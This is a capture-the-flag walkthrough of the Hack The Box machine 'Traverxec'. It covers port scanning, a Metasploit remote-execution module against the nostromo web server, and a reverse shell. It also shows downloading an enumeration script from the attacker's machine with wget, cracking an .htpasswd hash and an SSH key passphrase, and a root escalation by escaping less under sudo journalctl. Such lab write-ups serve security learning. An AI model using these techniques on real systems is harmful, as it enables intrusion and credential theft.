---
layout: walkthrough
title: Traverxec
description: HTB walkthrough
logo: /assets/img/walkthroughs/traverxec_logo.png
show-avatar: false
permalink: /walkthroughs/traverxec.html
OS: Linux
difficulty: Easy
release: 16 Nov 2019
creator: <a href="https://www.hackthebox.eu/home/users/profile/77141">jkr</a>
cleared: 19 Nov 2019
published: 2019 11 19
---

<h2 align="center">Enumeration</h2>
Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Sat Nov 16 20:02:47 2019 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.083s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 16 20:04:58 2019 -- 1 IP address (1 host up) scanned in 131.07 seconds

```

We see nothing but **22** and **80** are open, and navigating to the webpage we don't see much of interest

![homepage](/assets/img/walkthroughs/traverxec_homepage.png)

However if we run **searchsploit** on nostromo

```sh
root@kali:~/HTB/Boxes/Traverxec# searchsploit nostromo
```

We will see there is a metasploit module for remote command execution in Nostromo <= 1.9.6



<h3 align="center">Exploitation</h3>
We load metasploit and then use the nostromo exploit and set the RHOST and LHOST variables

![metasploit](/assets/img/walkthroughs/traverxec_metasploit.png)

and get a reverse shell as low privilege user www-data.

Let's run an enumeration script. We set up a python HTTP server on our local machine where we have our enumeration scripts

```sh
root@kali:/opt/privesc# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```

Then run **wget** on the remote machine to download the script so we can run it. 

```sh
www-data@traverxec:/tmp$ wget 10.10.14.7:8000/LinEnum.sh
wget 10.10.14.7:8000/LinEnum.sh
--2019-11-19 00:40:10--  http://10.10.14.7:8000/LinEnum.sh
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45656 (45K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  44.59K   188KB/s    in 0.2s    

2019-11-19 00:40:10 (188 KB/s) - 'LinEnum.sh' saved [45656/45656]
```

Then change mod on the script and run it

```sh
www-data@traverxec:/tmp$ chmod +x LinEnum.sh 
www-data@traverxec:/tmp$ ./LinEnum.sh 
#########################################################                                                                                                      
# Local Linux Enumeration & Privilege Escalation Script #                                                                                                      
#########################################################                                                                                                      
# www.rebootuser.com  
# version 0.971                                                                           
[-] Debug Info 
[+] Thorough tests = Disabled

Scan started at:
Tue Nov 19 00:52:42 EST 2019
```

If we go over the output one thing that will definitely stand out is

```
[-] htpasswd found - could contain passwords:   
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

we know that david is the user of the machine from the /etc/passwd file, and now we have a password hash belonging to him. So lets crack it! We'll use **John The Ripper** and the popular wordlist "rockyou.txt"

We copy and paste the hash into a file called hash.txt and then run john like so

![Nowonly4me](/assets/img/walkthroughs/traverxec_nowonly4me.png)

We now have the password "Nowonly4me", but we'll find that it wont work for either SSH or su'ing to david. If we dig around a little more in the /var/nostromo/conf/ folder and cat the nhttpd.conf file 

```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

We see that /home is the home directory and there is a public_www folder. If we look at /home/david/  we get permission denied, however if we look at /home/david/public_www we see some files.

```
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david
ls -la /home/david
ls: cannot open directory '/home/david': Permission denied
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www
ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Nov 18 23:53 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www/protected-file-area
<conf$ cd /home/david/public_www/protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$ 
```

It seems can't access the important looking backup-ssh files, however since we can read the file it's possible for us to move it to our computer to extract it by using **base64**.

![base64 encode](/assets/img/walkthroughs/traverxec_base64encode.png)

We simply copy the output and then paste it to a file on our computer, decode it, and then unzip as normal

![base64 decode](/assets/img/walkthroughs/traverxec_base64decode.png)

If we couldn't think of a way to access the file and got stuck, and tried looking at 10.10.10.165/david/ to no avail, as with all things when we stuck or frustrated, lets RTFM. Looking up the documentation for nostromo which we can find at http://www.nazgul.ch/dev/nostromo_man.html, we see the following

```
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:

           http://www.nazgul.ch/~hacki/

     The content of the home directory is handled exactly the same way as a
     directory in your document root.  If some users don't want that their
     home directory can be accessed via HTTP, they shall remove the world
     readable flag on their home directory and a caller will receive a 403
     Forbidden response.  Also, if basic authentication is enabled, a user can
     create an .htaccess file in his home directory and a caller will need to
     authenticate.

     You can restrict the access within the home directories to a single sub
     directory by defining it via the homedirs_public option.
```

Bingo! Trying 10.10.10.165/~david/ we are greeted with

![~david](/assets/img/walkthroughs/traverxec_dave.png)

and 10.10.10.165/~david/protected-file-area/ gets us something we can successfully enter in the credentials we found earlier
![login](/assets/img/walkthroughs/traverxec_login.png)

which then gives us access to the backup-ssh file

![protected](/assets/img/walkthroughs/traverxec_protected.png)

Extracting the tar file we see it's as advertised a backup of the ssh identity files.

```
root@kali:~/HTB/Boxes/Traverxec# tar -xvzf backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Let's crack the id_rsa file and then try and use it to SSH in as david. To do this first we need to convert it to a format we can use in john the ripper. We will use a python script included with john called ssh2john.py. Then we can crack the resulting file as we did the previous hash.

![hunter](/assets/img/walkthroughs/traverxec_hunter.png)

Now using that ssh key and the password "hunter" we SSH in as david.

```
root@kali:~/HTB/Boxes/Traverxec# ssh -i home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key 'home/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Nov 19 12:44:42 2019 from 10.10.14.13
david@traverxec:~$ ls /home/david/
bin  public_www  user.txt
david@traverxec:~$ 
```

as we can see we now have access to the user flag

<h3 align="center">On to Root</h3>
We see a "bin" folder in the user directory, if we examine the contents we find a script named "server-stats.sh", which if we cat shows us

```
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

Examining and running it we see it's basically just outputting a header (the other file in the bin directory) and a bit of information about the server. The last line of this script is the most important. We see it is running sudo and then journalctl, this means that journalctl is running with elevated privileges so if we can can figure out a way to bend that to our will we will have root privileges. However we don't seem to be able to change any of the arguments. When we run anything other than "sudo journalctl -n5 -unostromo.service" we are asked to supply a password.

If we look at GTFObins for journalctl (https://gtfobins.github.io/gtfobins/journalctl/) we see an important bit of information.

![gtfobins](/assets/img/walkthroughs/traverxec_gtfobins.png)

So journalctl is using **less** to write to the screen, and if we follow the link we see that we can break out of less into an interactive shell.

![gtfobins less](/assets/img/walkthroughs/traverxec_gtfobins_less.png)

There may or may not be a problem here depending on how big your terminal window is. If our terminal window is large enough to display everything outputted both vertically and horizontally then less will never give us the opportunity to break out into a shell, it will just output everything like so

![less too big](/assets/img/walkthroughs/traverxec_less_toobig.png)

But if we change the size of our terminal so that it is too narrow to display the entire line

![less too big](/assets/img/walkthroughs/traverxec_less_too_narrow.png)

or not tall enough to display all the lines
![less too big](/assets/img/walkthroughs/traverxec_less_too_short.png)

less does what less is supposed to do, and we can then enter !/bin/bash to escape into a root shell

![less too big](/assets/img/walkthroughs/traverxec_root.png)

Or we can use the **stty** command to change our terminal settings. "stty rows 5" will output only 5 lines when less is used and that will also allow us the opportunity to break out into a shell. Either way we now have access to the root flag.
